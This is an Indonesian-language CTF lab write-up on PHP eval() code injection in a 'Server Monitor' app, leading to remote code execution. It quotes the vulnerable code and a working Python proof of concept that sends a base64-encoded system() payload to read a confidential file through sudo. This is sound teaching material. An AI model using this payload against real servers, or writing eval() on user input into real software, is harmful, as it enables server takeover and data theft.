---
title: Rahasia Bahlil
description: Writeup lab Rahasia Bahlil
tags:
  - input injection
  - code injection
  - rce
  - CTF
draft: false
---

## Summary
* Vuln Name: `eval()` Injection (Code Injection)
* Type: Input Injection
* Impact: Remote Code Execution (RCE)
* Severity: Critical
* functionality: [[input-validation]], [[template-engine]]

## Metodologi dan Observasi
1. Pada aplikasi `Server Monitor` ini, terdapat fitur kustomisasi sapaan *dashboard* melalui parameter GET `title`.
2. Saat memeriksa *source code* pada `index.php`, kita dapat melihat bagaimana fungsi tersebut mengeksekusi parameter `title`:
   ```php
   if (isset($_GET['title'])) {
       $user_input = $_GET['title'];
       eval("\$custom_message = \"Welcome to " . $user_input . "\";");
   }
   ```
3. Pengembang aplikasi memasukkan data buatan pengguna (`$user_input`) langsung ke dalam argumen *string* yang akan diinterpretasikan ulang oleh mesin PHP lewat fungsi `eval()`.
4. String input tersebut diapiti oleh tanda kutip ganda (`"`). Jika kita mengirimkan input yang mengandung tanda kutip ganda penutup dan tanda titik koma (`;`), kita bisa "keluar" dari pernyataan asli penugasan variabel `$custom_message` dan memulai sintaks perintah PHP baru.
5. Kerentanan yang mengizinkan manipulasi sintaks bahasa di sisi server ini dikenal sebagai [[code-injection]]. Alhasil, penyerang sukses mendapatkan eksploitasi tingkat tertinggi, yaitu [[remote-code-execution]] (RCE).
6. Dalam lingkungan lab ini, kita juga harus beralih (*privilege escalation* lokal) sebagai *user* `bahlil` melalui `sudo` untuk membaca flag yang disembunyikan.

## PoC
Skrip eksploit ini membuat perintah dalam wujud Base64 (untuk menghindari masalah pelarian/escape karakter saat diletakkan di dalam argumen sintaks sisipan) dan mengirimkannya sebagai muatan payload URL.

```python
import requests
import base64

url = "http://localhost:1337/"
cmd = 'sudo -u bahlil /bin/bash -c "cat /home/bahlil/confidential.txt" 2>&1'
b64_cmd = base64.b64encode(cmd.encode()).decode()

# Payload: "; system(base64_decode('...')); //
payload = f'"; system(base64_decode(\'{b64_cmd}\')); //'

params = {'title': payload}
res = requests.get(url, params=params)

if "pwn{" in res.text:
    for line in res.text.split('\n'):
        if "pwn{" in line:
            print(f"[+] Flag found: {line.strip()}")
```

## Impact
Karena server menganggap input sebagai kode yang valid dan mengeksekusinya di tingkat sistem aplikasi, hal ini memberikan dampak sangat kritikal ([[remote-code-execution]]); penyerang bisa mengambil alih kendali utuh dari server, mengeksekusi perintah berbasis shell, dan menggali file lokal yang sangat konfidensial.
